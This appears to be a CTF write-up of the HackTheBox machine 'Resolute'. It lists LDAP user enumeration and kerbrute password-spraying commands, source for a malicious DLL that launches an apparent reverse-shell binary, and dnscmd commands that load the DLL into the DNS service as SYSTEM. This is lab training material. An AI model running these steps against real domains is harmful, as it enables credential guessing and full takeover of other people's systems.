---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/0fZp5exCi18/0.jpg
layout: post
media_subpath: /assets/posts/2020-05-30-resolute-hackthebox
tags:
- active directory
- dll
- dnsadmins
- ldap
- password spraying
title: Resolute @ HackTheBox
---

Resolute is a 30-point Windows machine on HackTheBox that involves enumerating LDAP, Password Spraying, and using the DNSAdmins group to register a custom plugin DLL which allows us to execute code as SYSTEM.

{% youtube 0fZp5exCi18 %}

## Notes

**Windapsearch**

```
windapsearch --dc resolute.htb -m users
windapsearch --dc resolute.htb -m users --full
windapsearch --dc resolute.htb -m users --attrs description
windapsearch --dc resolute.htb -m users --attrs sAMAccountName | grep sAMAccountName | cut -d " " -f2 | tee users.txt
```

<https://github.com/ropnop/windapsearch>

**Kerbrute**

```
kerbrute passwordspray -d megabank.local --dc resolute.htb users.txt 'Welcome123!'
```

<https://github.com/ropnop/kerbrute>

**DNSAdmins [Exploit](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)**

```cpp
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WinExec("C:\\programdata\\xc_10.10.14.4_1337.exe", 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```
dnscmd resolute /config /serverlevelplugindll c:\programdata\xct.dll
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

---

Thanks [egre55](https://twitter.com/egre55) for creating this fun box!